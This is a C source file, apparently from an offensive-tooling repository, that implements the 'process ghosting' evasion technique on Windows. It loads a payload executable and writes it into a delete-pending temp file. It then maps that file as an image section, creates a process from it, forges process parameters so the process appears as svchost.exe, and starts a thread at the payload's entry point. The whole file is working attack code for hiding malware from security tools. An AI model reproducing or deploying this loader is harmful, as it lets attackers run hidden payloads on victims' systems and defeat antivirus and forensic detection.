#include <windows.h>

#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_SUPERSEDED 0x00000000
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#define PS_INHERIT_HANDLES 4

typedef struct _LSA_UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    ULONG Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_MODULE
{
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID BaseAddress;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    PVOID Handle;
} CURDIR, *PCURDIR;

typedef struct _STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
    WORD Flags;
    WORD Length;
    ULONG TimeStamp;
    ANSI_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    PVOID ConsoleHandle;
    ULONG ConsoleFlags;
    PVOID StandardInput;
    PVOID StandardOutput;
    PVOID StandardError;
    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN Spare;
    HANDLE Mutant;
    PVOID ImageBase;
    PPEB_LDR_DATA LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PVOID FastPebLock;
    PVOID FastPebLockRoutine;
    PVOID FastPebUnlockRoutine;
    ULONG EnvironmentUpdateCount;
    PVOID *KernelCallbackTable;
    PVOID EventLogSection;
    PVOID EventLog;
    PVOID FreeList;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[0x2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID ReadOnlySharedMemoryHeap;
    PVOID *ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;
    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;
    BYTE Spare2[0x4];
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID **ProcessHeaps;
    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    PVOID GdiDCAttributeList;
    PVOID LoaderLock;
    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    ULONG OSBuildNumber;
    ULONG OSPlatformId;
    ULONG ImageSubSystem;
    ULONG ImageSubSystemMajorVersion;
    ULONG ImageSubSystemMinorVersion;
    ULONG GdiHandleBuffer[0x22];
    ULONG PostProcessInitRoutine;
    ULONG TlsExpansionBitmap;
    BYTE TlsExpansionBitmapBits[0x80];
    ULONG SessionId;
} PEB, *PPEB;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(i, o, a, r, s) \
    {                                             \
        (i)->Length = sizeof(OBJECT_ATTRIBUTES);  \
        (i)->RootDirectory = r;                   \
        (i)->Attributes = a;                      \
        (i)->ObjectName = o;                      \
        (i)->SecurityDescriptor = s;              \
        (i)->SecurityQualityOfService = NULL;     \
    }
typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _FILE_DISPOSITION_INFORMATION
{
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _PROCESS_BASIC_INFORMATION
{
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS
{
    FileDirectoryInformation = 1,            // FILE_DIRECTORY_INFORMATION
    FileFullDirectoryInformation,            // FILE_FULL_DIR_INFORMATION
    FileBothDirectoryInformation,            // FILE_BOTH_DIR_INFORMATION
    FileBasicInformation,                    // FILE_BASIC_INFORMATION
    FileStandardInformation,                 // FILE_STANDARD_INFORMATION
    FileInternalInformation,                 // FILE_INTERNAL_INFORMATION
    FileEaInformation,                       // FILE_EA_INFORMATION
    FileAccessInformation,                   // FILE_ACCESS_INFORMATION
    FileNameInformation,                     // FILE_NAME_INFORMATION
    FileRenameInformation,                   // FILE_RENAME_INFORMATION // 10
    FileLinkInformation,                     // FILE_LINK_INFORMATION
    FileNamesInformation,                    // FILE_NAMES_INFORMATION
    FileDispositionInformation,              // FILE_DISPOSITION_INFORMATION
    FilePositionInformation,                 // FILE_POSITION_INFORMATION
    FileFullEaInformation,                   // FILE_FULL_EA_INFORMATION
    FileModeInformation,                     // FILE_MODE_INFORMATION
    FileAlignmentInformation,                // FILE_ALIGNMENT_INFORMATION
    FileAllInformation,                      // FILE_ALL_INFORMATION
    FileAllocationInformation,               // FILE_ALLOCATION_INFORMATION
    FileEndOfFileInformation,                // FILE_END_OF_FILE_INFORMATION // 20
    FileAlternateNameInformation,            // FILE_NAME_INFORMATION
    FileStreamInformation,                   // FILE_STREAM_INFORMATION
    FilePipeInformation,                     // FILE_PIPE_INFORMATION
    FilePipeLocalInformation,                // FILE_PIPE_LOCAL_INFORMATION
    FilePipeRemoteInformation,               // FILE_PIPE_REMOTE_INFORMATION
    FileMailslotQueryInformation,            // FILE_MAILSLOT_QUERY_INFORMATION
    FileMailslotSetInformation,              // FILE_MAILSLOT_SET_INFORMATION
    FileCompressionInformation,              // FILE_COMPRESSION_INFORMATION
    FileObjectIdInformation,                 // FILE_OBJECTID_INFORMATION
    FileCompletionInformation,               // FILE_COMPLETION_INFORMATION // 30
    FileMoveClusterInformation,              // FILE_MOVE_CLUSTER_INFORMATION
    FileQuotaInformation,                    // FILE_QUOTA_INFORMATION
    FileReparsePointInformation,             // FILE_REPARSE_POINT_INFORMATION
    FileNetworkOpenInformation,              // FILE_NETWORK_OPEN_INFORMATION
    FileAttributeTagInformation,             // FILE_ATTRIBUTE_TAG_INFORMATION
    FileTrackingInformation,                 // FILE_TRACKING_INFORMATION
    FileIdBothDirectoryInformation,          // FILE_ID_BOTH_DIR_INFORMATION
    FileIdFullDirectoryInformation,          // FILE_ID_FULL_DIR_INFORMATION
    FileValidDataLengthInformation,          // FILE_VALID_DATA_LENGTH_INFORMATION
    FileShortNameInformation,                // FILE_NAME_INFORMATION // 40
    FileIoCompletionNotificationInformation, // FILE_IO_COMPLETION_NOTIFICATION_INFORMATION // since VISTA
    FileIoStatusBlockRangeInformation,       // FILE_IOSTATUSBLOCK_RANGE_INFORMATION
    FileIoPriorityHintInformation,           // FILE_IO_PRIORITY_HINT_INFORMATION
    FileSfioReserveInformation,              // FILE_SFIO_RESERVE_INFORMATION
    FileSfioVolumeInformation,               // FILE_SFIO_VOLUME_INFORMATION
    FileHardLinkInformation,                 // FILE_LINKS_INFORMATION
    FileProcessIdsUsingFileInformation,      // FILE_PROCESS_IDS_USING_FILE_INFORMATION
    FileNormalizedNameInformation,           // FILE_NAME_INFORMATION
    FileNetworkPhysicalNameInformation,      // FILE_NETWORK_PHYSICAL_NAME_INFORMATION
    FileIdGlobalTxDirectoryInformation,      // FILE_ID_GLOBAL_TX_DIR_INFORMATION // since WIN7 // 50
    FileIsRemoteDeviceInformation,           // FILE_IS_REMOTE_DEVICE_INFORMATION
    FileUnusedInformation,
    FileNumaNodeInformation,                      // FILE_NUMA_NODE_INFORMATION
    FileStandardLinkInformation,                  // FILE_STANDARD_LINK_INFORMATION
    FileRemoteProtocolInformation,                // FILE_REMOTE_PROTOCOL_INFORMATION
    FileRenameInformationBypassAccessCheck,       // (kernel-mode only); FILE_RENAME_INFORMATION // since WIN8
    FileLinkInformationBypassAccessCheck,         // (kernel-mode only); FILE_LINK_INFORMATION
    FileVolumeNameInformation,                    // FILE_VOLUME_NAME_INFORMATION
    FileIdInformation,                            // FILE_ID_INFORMATION
    FileIdExtdDirectoryInformation,               // FILE_ID_EXTD_DIR_INFORMATION // 60
    FileReplaceCompletionInformation,             // FILE_COMPLETION_INFORMATION // since WINBLUE
    FileHardLinkFullIdInformation,                // FILE_LINK_ENTRY_FULL_ID_INFORMATION
    FileIdExtdBothDirectoryInformation,           // FILE_ID_EXTD_BOTH_DIR_INFORMATION // since THRESHOLD
    FileDispositionInformationEx,                 // FILE_DISPOSITION_INFO_EX // since REDSTONE
    FileRenameInformationEx,                      // FILE_RENAME_INFORMATION_EX
    FileRenameInformationExBypassAccessCheck,     // (kernel-mode only); FILE_RENAME_INFORMATION_EX
    FileDesiredStorageClassInformation,           // FILE_DESIRED_STORAGE_CLASS_INFORMATION // since REDSTONE2
    FileStatInformation,                          // FILE_STAT_INFORMATION
    FileMemoryPartitionInformation,               // FILE_MEMORY_PARTITION_INFORMATION // since REDSTONE3
    FileStatLxInformation,                        // FILE_STAT_LX_INFORMATION // since REDSTONE4 // 70
    FileCaseSensitiveInformation,                 // FILE_CASE_SENSITIVE_INFORMATION
    FileLinkInformationEx,                        // FILE_LINK_INFORMATION_EX // since REDSTONE5
    FileLinkInformationExBypassAccessCheck,       // (kernel-mode only); FILE_LINK_INFORMATION_EX
    FileStorageReserveIdInformation,              // FILE_SET_STORAGE_RESERVE_ID_INFORMATION
    FileCaseSensitiveInformationForceAccessCheck, // FILE_CASE_SENSITIVE_INFORMATION
    FileMaximumInformation
} FILE_INFORMATION_CLASS,
    *PFILE_INFORMATION_CLASS;

typedef enum _PROCESSINFOCLASS
{
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef NTSYSAPI NTSTATUS(NTAPI *_NtOpenFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess,
    ULONG OpenOptions);

typedef void(WINAPI *_RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString);

typedef NTSTATUS(WINAPI *_NtSetInformationFile)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass);

typedef NTSTATUS(WINAPI *_NtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    PLARGE_INTEGER MaximumSize OPTIONAL,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle OPTIONAL);

typedef NTSTATUS(WINAPI *_NtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle OPTIONAL,
    HANDLE DebugPort OPTIONAL,
    HANDLE ExceptionPort OPTIONAL,
    BOOLEAN InJob);

typedef NTSYSAPI NTSTATUS(NTAPI *_NtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead);

typedef NTSYSAPI PIMAGE_NT_HEADERS(NTAPI *_RtlImageNtHeader)(
    PVOID Base);

typedef NTSYSAPI NTSTATUS(NTAPI *_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSYSAPI NTSTATUS(NTAPI *_NtCreateThreadEx)(
    PHANDLE hThread,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    DWORD StackZeroBits,
    DWORD SizeOfStackCommit,
    DWORD SizeOfStackReserve,
    LPVOID lpBytesBuffer);

typedef NTSYSAPI NTSTATUS(NTAPI *_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    VOID *Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten);

typedef NTSYSAPI NTSTATUS(NTAPI *_RtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags);

typedef NTSYSAPI NTSTATUS(NTAPI *_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength OPTIONAL);

int main()
{
    // read payload file into heap
    HANDLE hFile = CreateFileW(L"Z:\\git\\offensive_c\\bin\\myexe_mainexec.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    size_t payload_size = GetFileSize(hFile, 0);
    BYTE *payload = (BYTE *)VirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HANDLE hSection;
    UNICODE_STRING uFileName;
    IO_STATUS_BLOCK statusBlock = {0};
    ReadFile(hFile, payload, payload_size, NULL, NULL);
    CloseHandle(hFile);

    // make section from delete pending file
    wchar_t ntPath[MAX_PATH] = L"\\??\\";
    wchar_t tempFileName[MAX_PATH] = {0};
    wchar_t tempPath[MAX_PATH] = {0};
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"PG", 0, tempFileName);
    lstrcatW(ntPath, tempFileName);

    // HANDLE hSection = MakeSectionFromDeletePendingFile(ntPath, payload, payload_size);
    // HANDLE hProcess = CreateProcessWithSection(hSection);

    _RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
    pRtlInitUnicodeString(&uFileName, ntPath);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    _NtOpenFile pNtOpenFile = (_NtOpenFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile");
    pNtOpenFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
                &objAttr, &statusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE,
                FILE_SUPERSEDED | FILE_SYNCHRONOUS_IO_NONALERT);

    FILE_DISPOSITION_INFORMATION info = {0};
    info.DeleteFile = TRUE;
    _NtSetInformationFile pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
    pNtSetInformationFile(hFile, &statusBlock, &info, sizeof(info), FileDispositionInformation);

    WriteFile(hFile, payload, payload_size, NULL, NULL);

    _NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    hFile = NULL;

    // create process with section
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    _NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
    pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
                       GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

    PROCESS_BASIC_INFORMATION pbi;
    _NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

    // get entrypoint
    // entryPoint = GetEntryPoint(hProcess, payload, pbi);
    BYTE image[0x1000];
    ZeroMemory(image, sizeof(image));
    _NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
    pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), NULL);

    _RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
    DWORD64 entryPoint = (pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint);
    entryPoint += (DWORD64)((PPEB)image)->ImageBase;

    //

    WCHAR targetPath[MAX_PATH];
    UNICODE_STRING uDllPath;
    UNICODE_STRING uTargetFile;
    PRTL_USER_PROCESS_PARAMETERS processParameters;
    lstrcpyW(targetPath, L"C:\\windows\\system32\\svchost.exe");
    pRtlInitUnicodeString(&uTargetFile, targetPath);
    wchar_t dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = {0};
    pRtlInitUnicodeString(&uDllPath, dllDir);
    _RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
    pRtlCreateProcessParametersEx(&processParameters, &uTargetFile, &uDllPath, NULL,
                                  &uTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);

    // ALlocating memory for parameters in target process
    PVOID paramBuffer = processParameters;
    SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    pNtAllocateVirtualMemory(hProcess, &paramBuffer, 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Writing Process Parameters in Target Process
    _NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    pNtWriteVirtualMemory(hProcess, processParameters, processParameters,
                          processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
    PEB *remotePEB = (PEB *)pbi.PebBaseAddress;
    // Updating Process Parameters Address at remote PEB
    WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL);

    // Create Thread
    HANDLE hThread;
    _NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                      (LPTHREAD_START_ROUTINE)entryPoint, NULL, FALSE, 0, 0, 0, NULL);

    return 0;
}